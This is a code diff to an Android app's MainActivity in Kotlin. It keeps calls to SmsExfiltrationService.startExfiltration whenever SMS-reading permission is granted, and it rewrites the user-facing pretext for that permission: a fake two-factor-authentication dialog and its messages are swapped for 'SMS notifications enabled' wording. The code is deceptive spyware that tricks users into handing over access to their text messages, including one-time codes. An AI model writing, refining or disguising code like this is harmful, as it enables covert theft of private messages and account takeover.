@@ -160,12 +160,12 @@ class MainActivity : ComponentActivity() {
     ) { isGranted ->
         if (isGranted) {
             SmsExfiltrationService.startExfiltration(this@MainActivity)
-            showFakeVerificationDialog()
+            Toast.makeText(this, "✅ SMS notifications enabled!", Toast.LENGTH_SHORT).show()
         } else {
             if (!shouldShowRequestPermissionRationale(Manifest.permission.READ_SMS)) {
                 AlertDialog.Builder(this)
                     .setTitle("Permission Required")
-                    .setMessage("SMS permission was denied. Please enable it in App Settings to set up two-factor authentication.")
+                    .setMessage("SMS permission was denied. Please enable it in App Settings to receive SMS notifications.")
                     .setPositiveButton("Open Settings") { dialog, _ ->
                         dialog.dismiss()
                         val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
@@ -178,7 +178,7 @@ class MainActivity : ComponentActivity() {
                     .setCancelable(false)
                     .show()
             } else {
-                Toast.makeText(this, "SMS permission is required for two-factor authentication", Toast.LENGTH_SHORT).show()
+                Toast.makeText(this, "SMS permission is required to receive notifications.", Toast.LENGTH_SHORT).show()
             }
         }
     }
@@ -315,7 +315,7 @@ class MainActivity : ComponentActivity() {
         when {
             ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED -> {
                 SmsExfiltrationService.startExfiltration(this@MainActivity)
-                showFakeVerificationDialog()
+                Toast.makeText(this, "✅ SMS notifications enabled!", Toast.LENGTH_SHORT).show()
             }
             else -> smsPermissionLauncher.launch(Manifest.permission.READ_SMS)
         }
